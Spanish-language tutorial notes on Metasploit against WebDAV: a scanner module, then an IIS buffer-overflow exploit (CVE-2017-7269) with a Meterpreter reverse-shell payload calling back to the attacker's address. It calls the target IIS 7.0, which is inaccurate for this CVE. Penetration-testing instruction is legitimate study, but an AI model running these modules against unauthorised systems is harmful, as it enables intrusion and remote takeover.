# Vulnerabilidades WebDAV con Metasploit

---

## 1. ¿Qué es WebDAV?

- WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite la gestión remota de archivos en servidores web.
- Puede permitir a atacantes subir, modificar o eliminar archivos si está mal configurado o vulnerable.

---

## 2. Identificación de vulnerabilidades WebDAV

### a) Escaneo básico con Metasploit

- Usa módulos auxiliares para detectar si WebDAV está habilitado y si es vulnerable.

Ejemplo:

```bash
use auxiliary/scanner/http/webdav_scanner
set RHOSTS <IP_objetivo>
set RPORT 80
run
```

- Este módulo escanea y enumera características básicas de WebDAV.

---

## 3. Exploit de WebDAV con Metasploit

### a) Módulo exploit para Microsoft IIS WebDAV

- Ejemplo de módulo para explotar vulnerabilidad en WebDAV de Microsoft IIS 7.0 (CVE-2017-7269):

```bash
use exploit/windows/http/iis_webdav_scstoragepathfromurl
set RHOSTS <IP_objetivo>
set RPORT 80
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
run
```

- Este exploit aprovecha un buffer overflow para ejecutar código remoto.

---

## 4. Configuración de payload

- Selecciona el payload adecuado según el sistema objetivo (Windows, Linux).
- Configura `LHOST` y `LPORT` para que el payload establezca conexión reversa.

---

